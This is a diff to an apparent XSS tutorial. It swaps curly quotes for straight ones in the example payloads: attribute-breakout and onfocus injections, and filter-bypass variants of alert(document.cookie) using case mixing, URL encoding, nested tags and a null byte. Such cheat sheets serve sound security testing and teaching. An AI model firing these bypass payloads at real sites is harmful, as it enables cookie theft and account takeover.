@@ -453,9 +453,9 @@ The `x.setRequestHeader` is useful to create a more sharp request indicating the
 ###### XSS examples
 - Example 1: A Tag Attribute Value
 ```
-<input type=”text” name=”address1” value=”myxsstestdmqlwp”>
-	“><script>alert(1)</script>
-	“ onfocus=”alert(1)
+<input type="text" name="address1" value="myxsstestdmqlwp">
+	"><script>alert(1)</script>
+	" onfocus="alert(1)
 ```
 
 - Example 2: A JavaScript String
@@ -477,11 +477,11 @@ The `x.setRequestHeader` is useful to create a more sharp request indicating the
 Is common that some characters or expressions are banned in the server-side. How can we bypass it?
 **Basic approach**
 ```text
-“><script >alert(document.cookie)</script >
-“><ScRiPt>alert(document.cookie)</ScRiPt>
-“%3e%3cscript%3ealert(document.cookie)%3c/script%3e
-“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
-%00“><script>alert(document.cookie)</script>
+"><script >alert(document.cookie)</script >
+"><ScRiPt>alert(document.cookie)</ScRiPt>
+"%3e%3cscript%3ealert(document.cookie)%3c/script%3e
+"><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+%00"><script>alert(document.cookie)</script>
 ```
 
 **Base64 Encode**
